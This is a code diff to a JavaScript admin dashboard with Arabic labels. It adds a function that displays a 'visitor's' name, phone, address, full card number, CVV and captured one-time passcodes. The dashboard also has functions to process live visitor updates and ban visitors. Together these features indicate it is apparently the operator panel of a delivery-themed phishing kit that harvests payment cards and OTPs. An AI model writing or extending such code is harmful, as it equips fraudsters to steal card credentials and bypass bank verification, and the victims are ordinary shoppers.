@@ -2036,8 +2036,49 @@ window.toggleSound = toggleSound;
 window.processVisitorUpdate = processVisitorUpdate;
 window.createVisitorCardElement = createVisitorCardElement;
 window.updateVisitorCardFull = updateVisitorCardFull;
-window.viewVisitorDetails = viewVisitorDetails;
 window.banVisitor = banVisitor;
+
+// viewVisitorDetails - Show visitor in modal
+function viewVisitorDetails(sessionId) {
+  const data = visitorsCache.get(sessionId);
+  if (!data) {
+    alert('بيانات الزائر غير متوفرة');
+    return;
+  }
+  
+  // Build details HTML
+  let html = '<div style="text-align:right;direction:rtl;">';
+  html += '<h3>بيانات الزائر</h3>';
+  html += '<p><strong>Session:</strong> ' + sessionId + '</p>';
+  
+  if (data.delivery_data) {
+    html += '<h4>📦 بيانات التوصيل</h4>';
+    const d = data.delivery_data;
+    if (d.fullName) html += '<p><strong>الاسم:</strong> ' + escapeHtml(d.fullName) + '</p>';
+    if (d.phone) html += '<p><strong>الهاتف:</strong> ' + escapeHtml(d.phone) + '</p>';
+    if (d.email) html += '<p><strong>البريد:</strong> ' + escapeHtml(d.email) + '</p>';
+    if (d.city) html += '<p><strong>المدينة:</strong> ' + escapeHtml(d.city) + '</p>';
+    if (d.address) html += '<p><strong>العنوان:</strong> ' + escapeHtml(d.address) + '</p>';
+  }
+  
+  if (data.payment_data) {
+    html += '<h4>💳 بيانات الدفع</h4>';
+    const p = data.payment_data;
+    if (p.cardNumber) html += '<p><strong>البطاقة:</strong> ' + escapeHtml(p.cardNumber) + '</p>';
+    if (p.cardHolder) html += '<p><strong>صاحب البطاقة:</strong> ' + escapeHtml(p.cardHolder) + '</p>';
+    if (p.cvv) html += '<p><strong>CVV:</strong> ' + escapeHtml(p.cvv) + '</p>';
+  }
+  
+  if (data.verification_data?.otp || data.otp_history?.[0]?.otp) {
+    html += '<h4>🔐 OTP</h4>';
+    html += '<p><strong>الرمز:</strong> ' + (data.verification_data?.otp || data.otp_history[0].otp) + '</p>';
+  }
+  
+  html += '</div>';
+  
+  alert(html);
+}
+window.viewVisitorDetails = viewVisitorDetails;
 window.unbanUser = unbanUser;
 window.loadBannedUsers = loadBannedUsers;
 window.editProduct = editProduct;
